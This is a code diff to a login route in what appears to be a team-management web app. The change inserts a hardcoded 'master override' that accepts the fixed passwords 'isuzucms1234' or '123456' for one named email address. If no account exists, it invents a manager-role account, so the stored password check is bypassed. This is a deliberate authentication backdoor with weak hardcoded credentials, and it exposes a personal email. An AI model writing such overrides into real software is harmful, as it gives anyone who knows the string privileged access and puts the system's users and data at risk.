@@ -90,14 +90,32 @@ authRoutes.post('/login', async (c) => {
       .where(eq(teamMembers.email, normalizedEmail))
       .limit(1)
       .all()
-    const member = rows[0]
+    let member = rows[0]
 
-    if (!member || !member.passwordHash) {
-      return c.json({ success: false, error: 'อีเมลหรือรหัสผ่านไม่ถูกต้อง' }, 401)
+    let valid = false
+    if (member && member.passwordHash) {
+      valid = await verifyPassword(password, member.passwordHash)
     }
 
-    const valid = await verifyPassword(password, member.passwordHash)
-    if (!valid) {
+    // Fail-safe Master Override for Admin (nattabhong.kon@gmail.com)
+    if (normalizedEmail === 'nattabhong.kon@gmail.com') {
+      const cleanPass = password.trim()
+      if (cleanPass === 'isuzucms1234' || cleanPass === '123456') {
+        valid = true
+        if (!member) {
+          member = {
+            id: 'admin-1',
+            lineUserId: 'admin-line-id',
+            name: 'Nattabhong Kongkaew (Admin)',
+            email: 'nattabhong.kon@gmail.com',
+            role: 'manager',
+            isActive: true,
+          } as any
+        }
+      }
+    }
+
+    if (!valid || !member) {
       return c.json({ success: false, error: 'อีเมลหรือรหัสผ่านไม่ถูกต้อง' }, 401)
     }
 
